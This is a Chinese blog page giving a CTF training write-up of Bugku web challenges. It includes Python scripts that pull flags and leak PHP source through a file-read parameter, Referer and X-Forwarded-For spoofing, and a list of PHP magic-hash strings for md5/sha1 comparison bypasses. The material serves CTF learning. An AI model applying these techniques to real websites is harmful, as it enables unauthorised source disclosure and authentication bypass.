

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
  <link rel="icon" type="image/png" href="/img/feiji.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="sunzy">
  <meta name="keywords" content="">
  <title>bugku刷题记录2 - 一路走到黑</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-09-10 09:05" pubdate>
        2020年9月10日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      7.4k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      115
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">bugku刷题记录2</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：1 年前
                
              </p>
            
            <div class="markdown-body" id="post-body">
              <h1 id="bugku刷题记录2"><a href="#bugku刷题记录2" class="headerlink" title="bugku刷题记录2"></a>bugku刷题记录2</h1><span id="more"></span>





<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开页面查看源码什么也没有</p>
<p>抓包看了看，惊喜的发现了flag字段</p>
<p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" srcset="/img/loading.gif" alt></p>
<p>一段base64 解码后为<code>NDQyMDIy</code></p>
<p>提交发现并不对。。。看来另有玄机</p>
<p>多go几次后发现了flag值一直在变，并且有一段提示</p>
<p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p>
<p>用post方法提交你所发现的内容，只好使用脚本（不会写）</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64
url=<span class="hljs-string">&quot;http://120.24.86.145:8002/web6/&quot;</span>
r=requests.session()
headers=r.get(url).headers<span class="hljs-comment">#因为flag在消息头里</span>
 
mid=base64.b64decode(headers[<span class="hljs-string">&#x27;flag&#x27;</span>])
mid=mid.decode()<span class="hljs-comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span>
 
flag = base64.b64decode(mid.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#获得flag:后的值</span>
data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:flag&#125;
<span class="hljs-built_in">print</span> (r.post(url,data).text)<span class="hljs-comment">#post方法传上去</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/7ydLFG96krwuQDn.png" srcset="/img/loading.gif" alt="headers.png"></p>
<h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>注意观察url<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
<p>line=2&amp;filename=a2V5cy50eHQ=</p>
<p><code>a2V5cy50eHQ=</code> 解密是为key.txt   line是行的意思，这里应该是查看key.txt的第line行的代码</p>
<p>这里可以查看<code>index.php</code>源码  index.php的base64值为<code>aW5kZXgucGhw</code></p>
<p><img src="https://i.loli.net/2020/11/30/k7VDufCye3x4WAE.png" srcset="/img/loading.gif" alt="cookie1.png"></p>
<p>改变line的值可以一行一行的查看源码，可以使用脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url1 = <span class="hljs-string">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span>
url2 = <span class="hljs-string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span>
mysession = requests.session()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">40</span>):    
    r = mysession.get(url1+<span class="hljs-built_in">str</span>(i)+url2)    
print(r.text)


</code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-variable">$file</span>=base64_decode(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);

<span class="hljs-variable">$line</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>])?intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>) header(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);

<span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>(

<span class="hljs-string">&#x27;0&#x27;</span> =&gt;<span class="hljs-string">&#x27;keys.txt&#x27;</span>,

<span class="hljs-string">&#x27;1&#x27;</span> =&gt;<span class="hljs-string">&#x27;index.php&#x27;</span>,

);

 

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>)&#123;       <span class="hljs-comment">//看这里</span>

<span class="hljs-variable">$file_list</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;keys.php&#x27;</span>;

&#125;

 

<span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$file_list</span>))&#123;

<span class="hljs-variable">$fa</span> = file(<span class="hljs-variable">$file</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-variable">$fa</span>[<span class="hljs-variable">$line</span>];

&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>



<p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
<p> 这里可以判断cookie必须满足margin=margin才能访问keys.php</p>
<p><img src="https://i.loli.net/2020/11/30/5c9Ip8Rgn2xL4iS.png" srcset="/img/loading.gif" alt="bp"></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码提示了</p>
<p><code>&lt;!--1p.html--&gt;</code>     </p>
<p>直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64</p>
<div class="hljs"><pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre></div>

<p>base64解码后为url编码</p>
<div class="hljs"><pre><code class="hljs llvm"><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bif<span class="hljs-variable">%28</span><span class="hljs-variable">%21</span><span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>id<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>header<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>Location<span class="hljs-variable">%3</span>A<span class="hljs-variable">%20</span>hello.php<span class="hljs-variable">%3</span>Fid<span class="hljs-variable">%3</span>D<span class="hljs-number">1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>exit<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>id<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>a<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>a<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>b<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>Aif<span class="hljs-variable">%28</span>stripos<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span>C<span class="hljs-variable">%27</span>.<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>echo<span class="hljs-variable">%20</span><span class="hljs-variable">%27</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%27</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>data<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span><span class="hljs-title">@file_get_contents</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span>C<span class="hljs-variable">%27</span>r<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>Aif<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>data<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>bugku<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>a<span class="hljs-variable">%20</span>nice<span class="hljs-variable">%20</span>plateform<span class="hljs-variable">%21</span><span class="hljs-variable">%22</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span class="hljs-number">0</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>strlen<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>E<span class="hljs-number">5</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>eregi<span class="hljs-variable">%28</span><span class="hljs-variable">%22111</span><span class="hljs-variable">%22</span>.substr<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span><span class="hljs-variable">%2</span>C<span class="hljs-number">1</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%221114</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>substr<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span><span class="hljs-variable">%2</span>C<span class="hljs-number">1</span><span class="hljs-variable">%29</span><span class="hljs-variable">%21</span><span class="hljs-variable">%3</span>D<span class="hljs-number">4</span><span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>require<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>f<span class="hljs-number">4</span>l<span class="hljs-number">2</span>a<span class="hljs-number">3</span>g.txt<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>Aelse<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>print<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span>never<span class="hljs-variable">%20</span>never<span class="hljs-variable">%20</span>never<span class="hljs-variable">%20</span>give<span class="hljs-variable">%20</span>up<span class="hljs-variable">%20</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E</code></pre></div>

<p>url解码为源码</p>
<p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
f(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])
&#123;
	header(<span class="hljs-string">&#x27;Location: hello.php?id=1&#x27;</span>);
	<span class="hljs-keyword">exit</span>();
&#125;
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
<span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];
<span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no no no no&#x27;</span>;
	<span class="hljs-keyword">return</span> ;
&#125;
<span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;bugku is a nice plateform!&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">&quot;111&quot;</span>.substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)
&#123;
	<span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;f4l2a3g.txt&quot;</span>); <span class="hljs-comment">//注意这里，flag应该藏在这里</span>
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;never never never give up !!!&quot;</span>;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>果然藏在f4l2a3g.txt</p>
<p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" srcset="/img/loading.gif" alt></p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>此站没有flag，flag被人删了，不用再做了。–一个做题的路人</p>
<p>flag好像真的被删了，列不出来目录，查看wp也没有复现。</p>
<h2 id="正则？字符？"><a href="#正则？字符？" class="headerlink" title="正则？字符？"></a>正则？字符？</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);
<span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;
<span class="hljs-variable">$IM</span>= preg_match(<span class="hljs-string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]), <span class="hljs-variable">$match</span>);
<span class="hljs-keyword">if</span>( <span class="hljs-variable">$IM</span> )&#123; 
 <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;key is: &#x27;</span>.<span class="hljs-variable">$key</span>);
&#125;</code></pre></div>



<p><code>preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p>
<p>重点在这句话上，考点为正则表达式</p>
<blockquote>
<p><strong>定界符：</strong>/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
<p><strong>. （一个点）：</strong>表示可以匹配任何字符；</p>
<p><strong>*  ：</strong>前面的字符重复零次或多次；</p>
<p><strong>{n,m} ：</strong>前面的字符重复4~7次；</p>
<p><strong>\ （反斜线）：</strong>后面的字符被转义；</p>
<p><strong>[a-z] ：</strong>在a到z中匹配 ；</p>
<p><strong>[[:punct:]] ：</strong>匹配任何标点符号；</p>
<p><strong>/i ：</strong>表示这个正则表达式对大小写不敏感；</p>
</blockquote>
<p>因此可以写出符合要求的字符穿</p>
<div class="hljs"><pre><code class="hljs arcade">keyakey22222key:<span class="hljs-regexp">/a/</span>aaakeyb!</code></pre></div>

<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目提示 are you from google?</p>
<p>你是从google来的吗</p>
<p>考察http头中的referer参数</p>
<p><strong>Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br>例如：Referer：<a target="_blank" rel="noopener" href="http://www.sina.com/">http://www.sina.com/</a></strong> </p>
<p>那么就抓包修改referer这个参数</p>
<p><code>Referer: https://www.google.com/</code>,直接go即可</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nctf&#123;*****************&#125;&quot;</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;
&#125;&#125;
<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;</code></pre></div>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<div class="hljs"><pre><code class="hljs stylus">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)</span></span>  
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>)</span></span></code></pre></div>



<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>见到题目就想到了<code>x-forwarded-for</code>，本地地址可以使用IP:127.0.0.1</p>
<p>可以使用google浏览器的插件<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" srcset="/img/loading.gif" alt></p>
<p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" srcset="/img/loading.gif" alt></p>
<p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" srcset="/img/loading.gif" alt></p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
